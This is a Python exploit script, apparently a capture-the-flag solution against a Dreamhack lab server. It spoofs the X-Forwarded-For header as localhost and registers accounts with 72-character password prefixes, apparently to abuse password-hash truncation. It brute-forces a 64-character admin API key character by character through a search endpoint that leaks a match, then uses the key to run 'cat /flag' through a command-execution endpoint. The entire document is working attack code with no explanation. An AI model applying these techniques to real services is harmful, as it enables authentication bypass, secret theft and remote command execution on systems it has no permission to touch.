import requests
import string
import random

url = "http://host8.dreamhack.games:15427/"
s = requests.Session()

s.headers.update({
    "X-Forwarded-For": "127.0.0.1"
})

def login():
    creds = {
        "username": 'hacked',
        "password": "A" * 72 + str(random.randint(1, 10 ** 9))
    }

    s.post(f"{url}/user/register", json=creds)
    s.post(f"{url}/user/login", json=creds)

    return creds

def check(suffix, pw):
    res = s.post(
        f"{url}/admin/search",
        json={
            "password": pw,
            "apiKey": suffix
        }
    )

    return res.text

key = ''
charset = 'abcdef' + string.digits

while len(key) < 64:
    for char in charset:
        print("Trying:", char, '|', key)

        guess = char + key

        creds = login()
        resp = check(guess, creds['password'])

        if 'ADMIN' in resp:
            key = guess
            break

print("> Key:", key)

res = s.post(f"{url}/admin/run", headers={
    "X-Api-Key": key
}, params={
    "cmd": "cat /flag"
})

flag = res.json()['message'].strip()
print("Flag:",  flag)